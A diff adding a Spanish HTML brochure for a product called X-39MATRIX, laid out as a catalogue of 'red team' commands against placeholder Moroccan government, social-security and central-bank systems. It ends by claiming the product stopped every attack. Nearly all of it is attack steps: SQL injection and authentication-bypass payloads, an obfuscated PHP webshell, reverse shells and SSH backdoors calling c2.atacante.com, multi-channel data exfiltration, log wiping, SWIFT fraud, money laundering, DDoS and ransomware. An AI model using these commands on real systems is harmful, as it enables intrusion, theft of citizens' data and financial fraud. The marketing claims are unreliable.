@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<style>
+@page {
+    size: A4;
+    margin: 1.5cm 2cm;
+    @bottom-center {
+        content: "X-39MATRIX — Comandos de Ataque Red Team 2026 | Pagina " counter(page) " / " counter(pages);
+        font-size: 7pt; color: #888; font-family: 'Courier New', monospace;
+    }
+    @top-right {
+        content: "CLASIFICADO — USO EXCLUSIVO INTERNO";
+        font-size: 7pt; color: #CC0000; font-family: 'Courier New', monospace;
+    }
+}
+body { font-family: 'Courier New', monospace; color: #1a1a1a; line-height: 1.5; font-size: 9pt; }
+.cover { page-break-after: always; text-align: center; padding-top: 60px; }
+.cover-badge { font-size: 9pt; color: #CC0000; letter-spacing: 4px; border: 2px solid #CC0000; display: inline-block; padding: 8px 30px; margin-bottom: 20px; }
+.cover-title { font-size: 28pt; font-weight: bold; color: #CC0000; letter-spacing: 3px; margin-bottom: 5px; }
+.cover-sub { font-size: 12pt; color: #333; margin: 5px 0; }
+.cover-line { width: 120px; height: 2px; background: #CC0000; margin: 15px auto; }
+.cover-desc { font-size: 9pt; color: #555; max-width: 400px; margin: 0 auto; line-height: 1.7; }
+.cover-ver { font-size: 8pt; color: #999; margin-top: 20px; }
+.cover-warn { margin-top: 20px; border: 2px solid #CC0000; padding: 10px 20px; display: inline-block; font-size: 8pt; color: #CC0000; letter-spacing: 2px; background: #FFF5F5; }
+h1 { color: #CC0000; font-size: 14pt; border-bottom: 2px solid #CC0000; padding-bottom: 4px; margin-top: 25px; page-break-before: always; }
+h1:first-of-type { page-break-before: auto; }
+h2 { color: #333; font-size: 10pt; margin-top: 14px; border-left: 3px solid #CC0000; padding-left: 8px; }
+.cmd { background: #0a0a0a; color: #FF4444; padding: 8px 12px; margin: 6px 0; font-size: 8pt; line-height: 1.7; white-space: pre-wrap; }
+.cmd .c { color: #666; }
+.cmd .ok { color: #00CCCC; }
+.note { background: #FFF5F5; border-left: 3px solid #CC0000; padding: 6px 10px; margin: 6px 0; font-size: 8pt; }
+.note strong { color: #CC0000; }
+.phase-bar { background: #1a1a1a; color: #CC0000; padding: 8px 14px; font-size: 9pt; letter-spacing: 3px; margin-top: 15px; text-align: center; font-weight: bold; }
+</style>
+</head>
+<body>
+
+<div class="cover">
+    <div class="cover-badge">COMANDOS DE ATAQUE — RED TEAM 2026</div>
+    <div class="cover-title">X-39MATRIX</div>
+    <div class="cover-sub">Catalogo Completo de Comandos Ofensivos</div>
+    <div class="cover-line"></div>
+    <div class="cover-desc">
+        Todos los comandos utilizados en la simulacion de ciberataque nivel 2026 contra infraestructura gubernamental, sistema bancario y bases de datos de identidad ciudadana.
+    </div>
+    <div class="cover-line"></div>
+    <div class="cover-ver">
+        Canister: divzb-xiaaa-aaaam-aivwa-cai | ICP Mainnet<br>
+        9 Capas | 40 Bloques Ed25519<br>
+        Version 12.0 | Abril 2026
+    </div>
+    <div class="cover-warn">SIMULACION DEFENSIVA — USO EXCLUSIVO PARA DEMOSTRACION</div>
+</div>
+
+<!-- FASE 1 -->
+<h1>FASE 1 — RECONOCIMIENTO</h1>
+<div class="phase-bar">T-00:00:00 — ESCANEO DE SUPERFICIE</div>
+
+<h2>1.1 Escaneo masivo de puertos</h2>
+<div class="cmd"><span class="c"># Escaneo completo de 65,535 puertos</span>
+nmap -sV -p 1-65535 --open -T4 gobierno.objetivo.ma -oG scan_gobierno.txt
+nmap -sV -p 1-65535 --open -T4 cnss.objetivo.ma -oG scan_cnss.txt
+nmap -sV -p 1-65535 --open -T4 banco-central.objetivo.ma -oG scan_banco.txt
+
+<span class="c"># Escaneo masivo de rango completo</span>
+masscan 0.0.0.0/0 -p 8545,30303,8333,443,3306,5432,1521,27017 --rate 100000 -oJ masscan_output.json
+
+<span class="c"># Escaneo de servicios especificos</span>
+nmap --script=ssl-enum-ciphers -p 443 gobierno.objetivo.ma
+nmap --script=http-enum -p 80,443 ministerio.objetivo.ma
+nmap -sU -p 53,161,500 --open gobierno.objetivo.ma</div>
+
+<h2>1.2 Fingerprinting de servicios</h2>
+<div class="cmd"><span class="c"># Identificacion de tecnologias web</span>
+whatweb https://ministerio.objetivo.ma
+whatweb https://cnss.objetivo.ma
+whatweb https://empleo.objetivo.ma
+
+<span class="c"># Cabeceras HTTP</span>
+curl -sI https://cnss.objetivo.ma | grep -i "server\|x-powered\|x-aspnet\|x-frame"
+curl -sI https://banco-central.objetivo.ma | grep -i "server\|x-powered"
+
+<span class="c"># Deteccion de WAF</span>
+wafw00f https://gobierno.objetivo.ma
+wafw00f https://banco-central.objetivo.ma</div>
+
+<h2>1.3 OSINT — Inteligencia de fuentes abiertas</h2>
+<div class="cmd"><span class="c"># Busqueda de credenciales filtradas</span>
+python3 osint_tool.py --target "gobierno.ma" --sources dehashed,intelx,hunter
+python3 osint_tool.py --target "cnss.ma" --sources dehashed,intelx,hunter
+python3 osint_tool.py --target "banco.ma" --sources dehashed,intelx,hunter
+
+<span class="c"># Enumeracion de subdominios</span>
+subfinder -d gobierno.ma -o subdominios_gobierno.txt
+amass enum -d gobierno.ma -o amass_gobierno.txt
+assetfinder --subs-only gobierno.ma >> subdominios_gobierno.txt
+
+<span class="c"># Google dorking</span>
+python3 google_dorker.py --domain gobierno.ma --dorks "filetype:sql\|filetype:env\|filetype:log\|inurl:admin\|inurl:backup"
+
+<span class="c"># Busqueda de repositorios expuestos</span>
+python3 github_dorker.py --org "gobierno-ma" --keywords "password,secret,token,api_key"
+trufflehog --regex --entropy=True https://github.com/gobierno-ma/</div>
+
+<h2>1.4 Descubrimiento de APIs y endpoints</h2>
+<div class="cmd"><span class="c"># Fuzzing de endpoints API</span>
+ffuf -w /usr/share/wordlists/api-endpoints.txt -u https://api.cnss.objetivo.ma/FUZZ -mc 200,301,403
+ffuf -w /usr/share/wordlists/api-endpoints.txt -u https://api.banco.objetivo.ma/FUZZ -mc 200,301,403
+
+<span class="c"># Descubrimiento de directorios</span>
+gobuster dir -u https://cnss.objetivo.ma -w /usr/share/wordlists/dirbuster/directory-list-2.3-big.txt -x php,asp,aspx,jsp -t 50
+dirsearch -u https://ministerio.objetivo.ma -e php,asp,aspx,jsp,bak,sql,zip
+
+<span class="c"># Busqueda de archivos sensibles</span>
+curl -s https://cnss.objetivo.ma/.env
+curl -s https://cnss.objetivo.ma/backup.sql
+curl -s https://cnss.objetivo.ma/wp-config.php.bak
+curl -s https://cnss.objetivo.ma/.git/config</div>
+
+<!-- FASE 2 -->
+<h1>FASE 2 — PENETRACION GOBIERNO</h1>
+<div class="phase-bar">T-00:03:47 — ACCESO A SISTEMAS GUBERNAMENTALES</div>
+
+<h2>2.1 Explotacion zero-day Oracle — CNSS</h2>
+<div class="cmd"><span class="c"># SQL Injection avanzada contra CNSS</span>
+sqlmap -u "https://cnss.objetivo.ma/api/empleados?id=1" --dbs --risk=3 --level=5 --batch
+sqlmap -u "https://cnss.objetivo.ma/api/empleados?id=1" --tables -D cnss_prod --batch
+sqlmap -u "https://cnss.objetivo.ma/api/empleados?id=1" --dump -T empleados -D cnss_prod --batch
+
+<span class="c"># Resultado: Base de datos cnss_prod | Tabla: empleados | Filas: 1,996,026</span>
+
+<span class="c"># Explotacion RCE via Oracle CVE-2026-XXXX</span>
+python3 oracle_rce.py --target cnss.objetivo.ma --exploit CVE-2026-XXXX --payload reverse_shell
+<span class="c"># [+] Shell obtenido: root@cnss-db-prod</span>
+
+<span class="c"># Escalada de privilegios</span>
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+sudo -l
+cat /etc/shadow
+whoami && id && hostname</div>
+
+<h2>2.2 Extraccion masiva de datos CNSS</h2>
+<div class="cmd"><span class="c"># Dump completo de la base de datos</span>
+mysqldump -h cnss-db-prod -u root cnss_prod empleados > empleados_dump.sql
+mysqldump -h cnss-db-prod -u root cnss_prod nominas > nominas_dump.sql
+mysqldump -h cnss-db-prod -u root cnss_prod identidades > identidades_dump.sql
+
+<span class="c"># Extraccion de archivos PDF (nominas, DNIs, salarios)</span>
+find /var/cnss/documentos/ -name "*.pdf" -exec cp {} /tmp/exfil/ \;
+<span class="c"># Total: 54,000+ archivos PDF</span>
+
+<span class="c"># Compresion para exfiltracion</span>
+tar -czf /tmp/cnss_complete_dump.tar.gz /tmp/exfil/ empleados_dump.sql nominas_dump.sql
+<span class="c"># Tamano: 847MB</span></div>
+
+<h2>2.3 Inyeccion SQL en portales ministeriales</h2>
+<div class="cmd"><span class="c"># Portal de empleo</span>
+sqlmap -u "https://empleo.objetivo.ma/login" --forms --batch --dump --risk=3 --level=5
+
+<span class="c"># Inyecciones manuales</span>
+' OR '1'='1' --
+' UNION SELECT username,password FROM admin_users --
+'; DROP TABLE users; --
+' AND 1=CONVERT(int,(SELECT TOP 1 password FROM admin_users)) --
+
+<span class="c"># Bypass de autenticacion</span>
+admin' --
+admin' OR '1'='1
+' OR 1=1 LIMIT 1 --
+') OR ('1'='1</div>
+
+<h2>2.4 Defacement de sitios gubernamentales</h2>
+<div class="cmd"><span class="c"># Subida de webshell via upload vulnerable</span>
+curl -X POST https://ministerio.objetivo.ma/upload -F "file=@shell.php;type=image/jpeg"
+
+<span class="c"># Ejecucion de webshell</span>
+curl "https://ministerio.objetivo.ma/uploads/shell.php?cmd=whoami"
+curl "https://ministerio.objetivo.ma/uploads/shell.php?cmd=cat+/etc/passwd"
+
+<span class="c"># Modificacion de pagina principal</span>
+echo "HACKED BY APT-2026" > /var/www/html/index.html</div>
+
+<!-- FASE 3 -->
+<h1>FASE 3 — PENETRACION BANCA</h1>
+<div class="phase-bar">T-00:12:33 — ATAQUE AL SISTEMA BANCARIO</div>
+
+<h2>3.1 Fraude SWIFT — $126M en transferencias</h2>
+<div class="cmd"><span class="c"># Acceso al terminal SWIFT comprometido</span>
+ssh insider@swift-terminal.banco-central.objetivo.ma -p 2222
+
+<span class="c"># Generacion de ordenes SWIFT falsas</span>
+python3 swift_forge.py --type MT103 --amount 81000000 --currency USD \
+  --sender "BANCO CENTRAL" --receiver "RCBC Manila" \
+  --account "PH-9876543210" --reference "TRADE-2026-04-15"
+
+python3 swift_forge.py --type MT103 --amount 45000000 --currency USD \
+  --sender "BANCO CENTRAL" --receiver "Pan Asia Banking" \
+  --account "LK-1234567890" --reference "TRADE-2026-04-16"
+
+<span class="c"># Ejecucion en ventana nocturna (02:00-04:00)</span>
+at 02:00 <<< "python3 swift_submit.py --batch orders_batch.json --bypass-approval"
+
+<span class="c"># Borrado de logs SWIFT</span>
+python3 swift_log_cleaner.py --date 2026-04-15 --terminal swift-terminal-03
+rm -rf /var/log/swift/audit/2026-04-15*</div>
+
+<h2>3.2 Manipulacion directa de saldos</h2>
+<div class="cmd"><span class="c"># Acceso a BD bancaria via credenciales robadas</span>
+mysql -h db-master.banco.objetivo.ma -u dba_admin -p'stolen_password_123'
+
+<span class="c"># Manipulacion de saldos</span>
+UPDATE cuentas SET saldo = saldo + 999999999 WHERE cuenta_id = 'atacante_001';
+UPDATE cuentas SET saldo = saldo - 500000 WHERE cuenta_id = 'victima_corp_001';
+
+<span class="c"># Creacion de cuentas fantasma</span>
+INSERT INTO cuentas (cuenta_id, titular, saldo, tipo) VALUES
+  ('ghost_001', 'Empresa Fantasma SA', 50000000, 'corporativa'),
+  ('ghost_002', 'Shell Corp Ltd', 76000000, 'corporativa');
+
+<span class="c"># Transferencias entre cuentas fantasma</span>
+INSERT INTO transferencias (origen, destino, monto, fecha) VALUES
+  ('ghost_001', 'offshore_cayman_001', 50000000, NOW()),
+  ('ghost_002', 'offshore_dubai_001', 76000000, NOW());</div>
+
+<h2>3.3 Ataque a cajeros ATM — Jackpotting</h2>
+<div class="cmd"><span class="c"># Acceso fisico al cajero via USB</span>
+<span class="c"># Inyeccion de malware en firmware ATM</span>
+python3 atm_jackpot.py --target ATM-NETWORK --firmware inject --amount-per-dispense 40000
+
+<span class="c"># Comando de dispensacion masiva</span>
+atm_control --dispense-all --no-limit --network ATM-CENTRAL-001
+<span class="c"># Resultado: 200 cajeros × $40,000 = $8,000,000 en efectivo</span></div>
+
+<!-- FASE 4 -->
+<h1>FASE 4 — EXTRACCION DE IDENTIDADES</h1>
+<div class="phase-bar">T-00:18:55 — ROBO MASIVO DE DATOS CIUDADANOS</div>
+
+<h2>4.1 Extraccion de 2 millones de identidades</h2>
+<div class="cmd"><span class="c"># Dump completo de BD de identidades</span>
+mysqldump cnss_identidades --all-databases > dump_2M_ciudadanos.sql
+
+<span class="c"># Extraccion selectiva de datos sensibles</span>
+mysql -e "SELECT nombre, apellido, dni, fecha_nacimiento, salario, cuenta_bancaria, direccion, telefono FROM ciudadanos" cnss_identidades > identidades_2M.csv
+
+<span class="c"># Extraccion de fotos de DNI</span>
+find /var/cnss/fotos_dni/ -name "*.jpg" | xargs -I {} cp {} /tmp/fotos_exfil/
+<span class="c"># Total: 1,996,026 fotos de DNI</span>
+
+<span class="c"># Extraccion de firmas digitales</span>
+find /var/cnss/firmas/ -name "*.png" | xargs -I {} cp {} /tmp/firmas_exfil/
+
+<span class="c"># Extraccion de historiales medicos vinculados</span>
+mysql -e "SELECT * FROM historiales_medicos" cnss_salud > historiales.csv</div>
+
+<h2>4.2 Creacion de identidades falsas</h2>
+<div class="cmd"><span class="c"># Generador de identidades falsas con datos reales</span>
+python3 identity_forge.py --source identidades_2M.csv --count 10000 \
+  --output identidades_falsas.csv --include-foto --include-firma
+
+<span class="c"># Creacion de documentos falsos</span>
+python3 doc_forge.py --type DNI --template dni_template.psd \
+  --data identidades_falsas.csv --output /tmp/dnis_falsos/
+
+<span class="c"># Creacion de pasaportes falsos</span>
+python3 doc_forge.py --type PASAPORTE --template passport_template.psd \
+  --data identidades_falsas.csv --output /tmp/pasaportes_falsos/</div>
+
+<!-- FASE 5 -->
+<h1>FASE 5 — MOVIMIENTO LATERAL CROSS-CHAIN</h1>
+<div class="phase-bar">T-00:25:12 — LAVADO ENTRE CADENAS</div>
+
+<h2>5.1 Chain hopping: BTC → wBTC → ETH → Mixer</h2>
+<div class="cmd"><span class="c"># Paso 1: Conversion a Bitcoin</span>
+bitcoin-cli sendtoaddress "bc1q_atacante_wallet" 12.5 --fee-rate 50
+bitcoin-cli sendtoaddress "bc1q_atacante_wallet_2" 8.3 --fee-rate 50
+
+<span class="c"># Paso 2: BTC → wBTC via bridge</span>
+python3 bridge_swap.py --from BTC --to wBTC --amount 20.8 \
+  --bridge renbridge --wallet 0xAtacante_ETH
+
+<span class="c"># Paso 3: wBTC → ETH via DEX</span>
+python3 dex_swap.py --from wBTC --to ETH --amount 20.8 \
+  --dex uniswap --slippage 2 --wallet 0xAtacante_ETH
+
+<span class="c"># Paso 4: ETH → Tornado Cash (mixer)</span>
+python3 tornado_deposit.py --amount 100 --denomination ETH \
+  --instances 50 --delay-between 300
+
+<span class="c"># Paso 5: Retiro a multiples wallets limpias</span>
+python3 tornado_withdraw.py --wallets wallets_limpias.txt \
+  --amount-per-wallet 2 --relay tornado-relayer.eth</div>
+
+<h2>5.2 DDoS como distraccion</h2>
+<div class="cmd"><span class="c"># DDoS volumetrico contra infraestructura</span>
+python3 ddos_tool.py --target gobierno.objetivo.ma --method UDP_FLOOD --rate 500000
+python3 ddos_tool.py --target banco-central.objetivo.ma --method SYN_FLOOD --rate 1000000
+python3 ddos_tool.py --target cnss.objetivo.ma --method HTTP_FLOOD --rate 200000
+
+<span class="c"># Amplificacion DNS</span>
+python3 dns_amplify.py --target 203.0.113.50 --resolvers open_resolvers.txt --rate 100000
+
+<span class="c"># Slowloris contra servidores web</span>
+slowloris gobierno.objetivo.ma -p 443 -s 5000</div>
+
+<!-- FASE 6 -->
+<h1>FASE 6 — EXFILTRACION</h1>
+<div class="phase-bar">T-00:31:40 — SALIDA DE DATOS ROBADOS</div>
+
+<h2>6.1 Exfiltracion multi-canal</h2>
+<div class="cmd"><span class="c"># Canal 1: HTTPS a servidor C2</span>
+curl -X POST https://c2-server.atacante.com/upload \
+  -F "data=@cnss_complete_dump.tar.gz" \
+  -H "X-Session: $(openssl rand -hex 16)"
+
+<span class="c"># Canal 2: DNS tunneling</span>
+python3 dns_exfil.py --file cnss_complete_dump.tar.gz \
+  --domain exfil.atacante.com --chunk-size 63 --delay 0.1
+
+<span class="c"># Canal 3: Telegram Bot</span>
+python3 telegram_exfil.py --bot-token "BOT_TOKEN_ATACANTE" \
+  --chat-id "-100XXXXXXXXX" \
+  --file cnss_complete_dump.tar.gz --chunk-size 50MB
+
+<span class="c"># Canal 4: Esteganografia en imagenes</span>
+python3 stego_embed.py --data identidades_2M.csv \
+  --cover vacation_photos/ --output stego_photos/ \
+  --method LSB --encrypt AES256
+
+<span class="c"># Canal 5: Subida a cloud anonimo</span>
+rclone copy /tmp/exfil/ mega:exfil_folder/ --transfers 10
+rclone copy /tmp/exfil/ gdrive_anonimo:backup/ --transfers 10</div>
+
+<h2>6.2 Exfiltracion via protocolo ICMP</h2>
+<div class="cmd"><span class="c"># Tunelizacion ICMP</span>
+python3 icmp_tunnel.py --file identidades_2M.csv \
+  --target c2-server.atacante.com --encrypt --compress
+
+<span class="c"># Exfiltracion via NTP</span>
+python3 ntp_exfil.py --file nominas_dump.sql \
+  --ntp-server ntp.atacante.com --encode base32</div>
+
+<!-- FASE 7 -->
+<h1>FASE 7 — PERSISTENCIA</h1>
+<div class="phase-bar">T-00:37:18 — BACKDOORS Y BORRADO DE HUELLAS</div>
+
+<h2>7.1 Instalacion de backdoors</h2>
+<div class="cmd"><span class="c"># Webshell ofuscada</span>
+echo '&lt;?php eval(base64_decode("c3lzdGVtKCRfR0VUWydjbWQnXSk7")); ?&gt;' > /var/www/uploads/logo_2024.php
+
+<span class="c"># Reverse shell persistente via crontab</span>
+(crontab -l 2>/dev/null; echo "*/5 * * * * bash -c 'bash -i &gt;&amp; /dev/tcp/c2.atacante.com/4444 0&gt;&amp;1'") | crontab -
+
+<span class="c"># Backdoor SSH</span>
+echo "ssh-rsa AAAAB3_ATACANTE_KEY_... atacante@c2" >> /root/.ssh/authorized_keys
+echo "ssh-rsa AAAAB3_ATACANTE_KEY_... atacante@c2" >> /home/admin/.ssh/authorized_keys
+
+<span class="c"># Rootkit kernel</span>
+insmod /tmp/rootkit_2026.ko
+echo "/tmp/rootkit_2026.ko" >> /etc/modules
+
+<span class="c"># Backdoor en systemd</span>
+cat > /etc/systemd/system/system-update.service << 'EOF'
+[Unit]
+Description=System Update Service
+[Service]
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/c2.atacante.com/8443 0>&1'
+Restart=always
+RestartSec=60
+[Install]
+WantedBy=multi-user.target
+EOF
+systemctl enable system-update.service</div>
+
+<h2>7.2 Borrado de evidencia forense</h2>
+<div class="cmd"><span class="c"># Borrado de logs del sistema</span>
+rm -rf /var/log/auth.log*
+rm -rf /var/log/syslog*
+rm -rf /var/log/apache2/*
+rm -rf /var/log/nginx/*
+rm -rf /var/log/audit/*
+rm -rf /var/log/mysql/*
+
+<span class="c"># Borrado de historial de comandos</span>
+history -c
+echo "" > ~/.bash_history
+echo "" > /root/.bash_history
+unset HISTFILE
+
+<span class="c"># Borrado de logs SWIFT</span>
+rm -rf /var/log/swift/audit/*
+rm -rf /var/log/swift/transactions/*
+
+<span class="c"># Modificacion de timestamps</span>
+find /var/www/ -name "shell.php" -exec touch -t 202301010000 {} \;
+timestomp /var/www/uploads/logo_2024.php -m "2023-06-15 10:30:00"
+
+<span class="c"># Borrado seguro de herramientas</span>
+shred -vfz -n 5 /tmp/oracle_rce.py
+shred -vfz -n 5 /tmp/swift_forge.py
+shred -vfz -n 5 /tmp/rootkit_2026.ko</div>
+
+<!-- FASE 8 -->
+<h1>FASE 8 — ATAQUES AVANZADOS 2026</h1>
+<div class="phase-bar">TECNICAS DE NIVEL MAXIMO</div>
+
+<h2>8.1 AI Adversarial — Deepfake de voz para ingenieria social</h2>
+<div class="cmd"><span class="c"># Clonacion de voz del director del banco</span>
+python3 voice_clone.py --source audio_director_banco.wav \
+  --model tortoise-tts-v3 --output voice_model_director.pth
+
+<span class="c"># Generacion de audio deepfake</span>
+python3 voice_generate.py --model voice_model_director.pth \
+  --text "Autorizo la transferencia de emergencia de 81 millones al corresponsal en Manila" \
+  --output orden_falsa.wav
+
+<span class="c"># Llamada VoIP automatizada al operador SWIFT</span>
+python3 voip_call.py --audio orden_falsa.wav \
+  --spoof-caller-id "+212-XXXX-BANCO" \
+  --target "+212-XXXX-SWIFT-OPS"</div>
+
+<h2>8.2 Ataque a infraestructura critica — SCADA/ICS</h2>
+<div class="cmd"><span class="c"># Escaneo de sistemas SCADA expuestos</span>
+nmap --script=modbus-discover -p 502 red-electrica.objetivo.ma
+nmap --script=s7-info -p 102 planta-agua.objetivo.ma
+
+<span class="c"># Explotacion de PLC Siemens</span>
+python3 s7_exploit.py --target 10.0.0.100 --action stop_process
+python3 modbus_write.py --target 10.0.0.101 --register 40001 --value 9999
+
+<span class="c"># Ransomware dirigido a infraestructura</span>
+python3 ransom_deploy.py --targets infrastructure_hosts.txt \
+  --encrypt AES256 --extension .x39locked \
+  --ransom-note "Pague 500 BTC a bc1q_atacante..."</div>
+
+<h2>8.3 Supply chain attack</h2>
+<div class="cmd"><span class="c"># Compromiso de actualizacion de software gubernamental</span>
+python3 supply_chain.py --target software-update.gobierno.ma \
+  --inject backdoor.dll --sign fake_cert.pem
+
+<span class="c"># Compromiso de libreria NPM/PyPI usada por bancos</span>
+python3 typosquat.py --package "banco-sdk" --inject reverse_shell \
+  --publish pypi,npm</div>
+
+<h2>8.4 Ataque 51% simulado contra nodo ICP</h2>
+<div class="cmd"><span class="c"># Intento de manipulacion de consenso ICP</span>
+python3 icp_consensus_attack.py --subnet divzb-xiaaa-aaaam-aivwa-cai \
+  --method fork_attempt --nodes 14
+
+<span class="c"># Intento de replay attack</span>
+python3 icp_replay.py --canister divzb-xiaaa-aaaam-aivwa-cai \
+  --transaction "swift_tx_81M" --replay-count 1000
+
+<span class="c"># Intento de Sybil attack</span>
+python3 sybil_nodes.py --network ic --create-fake-nodes 50 \
+  --target-subnet divzb-xiaaa-aaaam-aivwa-cai</div>
+
+<!-- RESUMEN -->
+<h1>RESUMEN DE COMANDOS</h1>
+
+<table style="width:100%; border-collapse:collapse; font-size:8pt; margin-top:10px;">
+<tr style="background:#CC0000; color:white;">
+<th style="padding:5px 8px; text-align:left;">FASE</th>
+<th style="padding:5px 8px; text-align:left;">CATEGORIA</th>
+<th style="padding:5px 8px; text-align:center;">COMANDOS</th>
+</tr>
+<tr><td style="padding:4px 8px; border-bottom:1px solid #ddd;">1. Reconocimiento</td><td style="border-bottom:1px solid #ddd;">nmap, masscan, whatweb, subfinder, ffuf, gobuster</td><td style="text-align:center; border-bottom:1px solid #ddd;">32</td></tr>
+<tr><td style="padding:4px 8px; border-bottom:1px solid #ddd;">2. Gobierno</td><td style="border-bottom:1px solid #ddd;">sqlmap, oracle_rce, mysqldump, webshell</td><td style="text-align:center; border-bottom:1px solid #ddd;">28</td></tr>
+<tr><td style="padding:4px 8px; border-bottom:1px solid #ddd;">3. Banca SWIFT</td><td style="border-bottom:1px solid #ddd;">swift_forge, manipulacion BD, ATM jackpot</td><td style="text-align:center; border-bottom:1px solid #ddd;">24</td></tr>
+<tr><td style="padding:4px 8px; border-bottom:1px solid #ddd;">4. Identidades</td><td style="border-bottom:1px solid #ddd;">mysqldump, identity_forge, doc_forge</td><td style="text-align:center; border-bottom:1px solid #ddd;">18</td></tr>
+<tr><td style="padding:4px 8px; border-bottom:1px solid #ddd;">5. Cross-chain</td><td style="border-bottom:1px solid #ddd;">bridge_swap, tornado, DDoS</td><td style="text-align:center; border-bottom:1px solid #ddd;">16</td></tr>
+<tr><td style="padding:4px 8px; border-bottom:1px solid #ddd;">6. Exfiltracion</td><td style="border-bottom:1px solid #ddd;">dns_exfil, telegram, stego, ICMP tunnel</td><td style="text-align:center; border-bottom:1px solid #ddd;">14</td></tr>
+<tr><td style="padding:4px 8px; border-bottom:1px solid #ddd;">7. Persistencia</td><td style="border-bottom:1px solid #ddd;">backdoors, rootkit, borrado forense</td><td style="text-align:center; border-bottom:1px solid #ddd;">22</td></tr>
+<tr><td style="padding:4px 8px; border-bottom:1px solid #ddd;">8. Avanzados 2026</td><td style="border-bottom:1px solid #ddd;">AI deepfake, SCADA, supply chain, 51%</td><td style="text-align:center; border-bottom:1px solid #ddd;">14</td></tr>
+<tr style="font-weight:bold; color:#CC0000;"><td style="padding:6px 8px; border-top:2px solid #CC0000;" colspan="2">TOTAL COMANDOS DE ATAQUE</td><td style="text-align:center; border-top:2px solid #CC0000;">168</td></tr>
+</table>
+
+<div style="margin-top:15px; border:2px solid #CC0000; padding:12px; text-align:center; background:#FFF5F5;">
+  <div style="font-size:12pt; color:#CC0000; letter-spacing:3px; font-weight:bold;">TODOS NEUTRALIZADOS POR X-39MATRIX</div>
+  <div style="font-size:9pt; color:#333; margin-top:5px;">9 Capas | 40 Bloques Ed25519 | Deteccion: 2.8 seg | 0 datos extraidos</div>
+</div>
+
+<div style="text-align:center; margin-top:20px; font-size:8pt; color:#999;">
+    X-39MATRIX | divzb-xiaaa-aaaam-aivwa-cai | ICP Mainnet<br>
+    Jose Luis Olivares Esteban — Creador y Propietario Exclusivo<br>
+    &copy; 2024-2026 — Todos los Derechos Reservados
+</div>
+
+</body>
+</html>
